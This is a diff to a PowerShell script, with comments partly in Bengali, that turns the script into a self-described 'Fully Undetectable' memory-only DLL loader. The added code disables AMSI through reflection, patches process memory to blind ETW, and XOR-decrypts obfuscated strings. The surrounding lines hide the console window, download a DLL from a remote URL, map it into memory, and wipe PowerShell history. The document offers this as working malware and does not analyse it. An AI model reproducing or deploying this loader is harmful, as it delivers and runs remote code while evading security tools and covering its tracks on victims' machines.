@@ -49,6 +49,48 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
 
+<#
+.SYNOPSIS
+    Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
+.DESCRIPTION
+    Downloads DLL from Base64-encoded URL and manually maps it into memory.
+    No disk write. All strings are XOR-encrypted.
+.NOTES
+    Made by Potato - Fully Undetectable
+#>
+
+# ================================================================
+#  ★★★ ১. AMSI + ETW বাইপাস ★★★
+# ================================================================
+function Invoke-Bypass {
+    # AMSI
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    } catch {}
+    # ETW
+    try {
+        $p = [System.Diagnostics.Process]::GetCurrentProcess()
+        $h = $p.Handle
+        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
+        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
+        $old = 0
+        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
+        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
+        $v.Invoke($t, 0x1000, $old, [ref]$null)
+    } catch {}
+}
+
+# ================================================================
+#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
+# ================================================================
+function Xor-Decrypt {
+    param([string]$Encoded, [byte]$Key = 0x5A)
+    $bytes = [Convert]::FromBase64String($Encoded)
+    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+
 function Invoke-Finalize {
     try {
         Get-Variable -Scope Script -ErrorAction SilentlyContinue |
@@ -239,6 +281,10 @@ public static class NativeLoader
 }
 '@
 
+
+# ৪.১ – BYPASS কল করো
+Invoke-Bypass
+
 try {
     $type = Add-Type $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
 }
@@ -250,6 +296,12 @@ $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/dese
 
 [NativeLoader]::Map($bytes, $true)
 Invoke-Finalize
+
+
+# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
+$bytes = $null
+$plainCSharp = $null
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
